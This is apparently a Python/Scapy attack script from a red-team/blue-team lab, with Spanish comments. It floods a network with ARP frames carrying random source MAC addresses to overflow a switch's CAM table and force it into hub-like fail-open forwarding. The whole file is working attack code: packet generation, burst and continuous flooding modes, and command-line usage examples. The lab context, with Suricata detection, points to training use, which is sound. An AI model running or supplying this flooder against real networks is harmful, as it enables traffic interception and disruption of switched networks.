#!/usr/bin/env python3
"""
=============================================================================
MAC Flooding - Ataque de inundacion de tabla CAM/MAC
=============================================================================
Este script inunda la red con tramas Ethernet que tienen MACs origen aleatorias.
El objetivo es desbordar la tabla CAM (Content Addressable Memory) del switch.

COMO FUNCIONA:
  1. Un switch aprende asociaciones Puerto <-> MAC al ver tramas
  2. La tabla CAM tiene capacidad limitada (tipicamente 8K-32K entradas)
  3. Al llenarla, el switch no puede aprender nuevas MACs
  4. El switch entra en modo "fail-open": reenvio todo el trafico por
     todos los puertos (comportamiento de HUB)
  5. El atacante puede ver trafico que no le corresponde

NOTA: En Docker bridge, el "switch" es el kernel de Linux, que tiene una
tabla MAC mas grande. El ataque genera el trafico pero el efecto real se
observaria en un switch fisico. En nuestro lab, Suricata y los scripts
del Blue Team detectaran la anomalia.

EJEMPLO DE USO:
  # Inundar con 10000 MACs aleatorias
  python3 mac_flood.py -c 10000

  # Inundar continuamente a alta velocidad
  python3 mac_flood.py --continuous

  # Especificar interfaz y velocidad
  python3 mac_flood.py -c 5000 -i eth0 --delay 0.001

REQUISITOS:
  - Privilegios root (NET_ADMIN + NET_RAW)
  - Scapy instalado
=============================================================================
"""

import argparse
import sys
import time
import signal
from scapy.all import Ether, ARP, IP, UDP, RandMAC, RandIP, sendp, conf


def generate_flood_packet(iface):
    """
    Genera un paquete Ethernet con MAC origen aleatoria.

    Cada paquete simula ser de un host diferente, forzando al switch
    a crear una nueva entrada en su tabla CAM.

    Se usa un ARP Request como payload porque:
    - Es un paquete L2 valido que el switch debe procesar
    - No requiere stack IP completo
    - Genera actividad en la tabla CAM del switch
    """
    # =========================================================================
    # Paquete de inundacion MAC
    # =========================================================================
    # Capa 2 - Ethernet
    #   src = RandMAC()            -> MAC origen ALEATORIA (diferente cada vez)
    #                                 Cada MAC nueva = nueva entrada en tabla CAM
    #   dst = "ff:ff:ff:ff:ff:ff"  -> Broadcast (asegura que el switch procese)
    #   type = 0x0806              -> EtherType ARP
    #
    # Capa 2.5 - ARP
    #   op = 1 (who-has)           -> ARP Request
    #   psrc = RandIP()            -> IP origen aleatoria (no importa realmente)
    #   pdst = RandIP()            -> IP destino aleatoria
    #   hwsrc = (misma MAC random) -> Consistencia con Ethernet src
    #
    # RESULTADO: El switch registra una nueva MAC en su tabla CAM
    #            Al desbordar, entra en modo fail-open (hub)
    # =========================================================================
    random_mac = str(RandMAC())
    pkt = Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
        op="who-has",
        hwsrc=random_mac,   # MAC origen (consistente con Ethernet)
        psrc=str(RandIP()),  # IP origen aleatoria
        pdst=str(RandIP())   # IP destino aleatoria
    )
    return pkt


def flood_burst(count, iface, delay):
    """
    Envia una rafaga de paquetes con MACs aleatorias.

    Args:
        count: Numero de paquetes a enviar
        iface: Interfaz de red
        delay: Pausa entre paquetes (0 = maxima velocidad)
    """
    print(f"[*] Enviando {count} paquetes con MACs aleatorias...")
    sent = 0

    for i in range(count):
        pkt = generate_flood_packet(iface)
        sendp(pkt, iface=iface, verbose=False)
        sent += 1

        if sent % 100 == 0:
            print(f"\r[*] Paquetes enviados: {sent}/{count}", end="", flush=True)

        if delay > 0:
            time.sleep(delay)

    print(f"\n[+] Rafaga completada: {sent} paquetes enviados")
    return sent


def flood_continuous(iface, delay):
    """
    Inundacion continua hasta que se presione Ctrl+C.

    Args:
        iface: Interfaz de red
        delay: Pausa entre paquetes
    """
    print("[*] Inundacion continua... (Ctrl+C para detener)")
    sent = 0
    start_time = time.time()

    running = True

    def stop_handler(sig, frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, stop_handler)
    signal.signal(signal.SIGTERM, stop_handler)

    while running:
        pkt = generate_flood_packet(iface)
        sendp(pkt, iface=iface, verbose=False)
        sent += 1

        if sent % 100 == 0:
            elapsed = time.time() - start_time
            rate = sent / elapsed if elapsed > 0 else 0
            print(f"\r[*] Enviados: {sent} | Velocidad: {rate:.0f} pkt/s", end="", flush=True)

        if delay > 0:
            time.sleep(delay)

    elapsed = time.time() - start_time
    print(f"\n\n[+] Ataque detenido")
    print(f"[+] Total enviados: {sent} paquetes en {elapsed:.1f}s")
    print(f"[+] Velocidad promedio: {sent/elapsed:.0f} pkt/s")
    return sent


def main():
    parser = argparse.ArgumentParser(
        description="MAC Flooding - Desborda la tabla CAM del switch",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  # Rafaga de 10000 paquetes
  python3 mac_flood.py -c 10000

  # Inundacion continua
  python3 mac_flood.py --continuous

  # Rafaga rapida (sin delay)
  python3 mac_flood.py -c 5000 --delay 0
        """
    )
    parser.add_argument("-c", "--count", type=int, default=5000,
                        help="Numero de paquetes a enviar (default: 5000)")
    parser.add_argument("-i", "--interface", default="eth0",
                        help="Interfaz de red (default: eth0)")
    parser.add_argument("--delay", type=float, default=0.001,
                        help="Delay entre paquetes en segundos (default: 0.001)")
    parser.add_argument("--continuous", action="store_true",
                        help="Modo continuo (hasta Ctrl+C)")
    args = parser.parse_args()

    print("=" * 60)
    print("  MAC Flooding - CAM Table Overflow Attack")
    print("=" * 60)
    print(f"  Interface: {args.interface}")
    print(f"  Modo:      {'Continuo' if args.continuous else f'Rafaga ({args.count} pkts)'}")
    print(f"  Delay:     {args.delay}s")
    print("=" * 60)

    if args.continuous:
        flood_continuous(args.interface, args.delay)
    else:
        flood_burst(args.count, args.interface, args.delay)


if __name__ == "__main__":
    main()
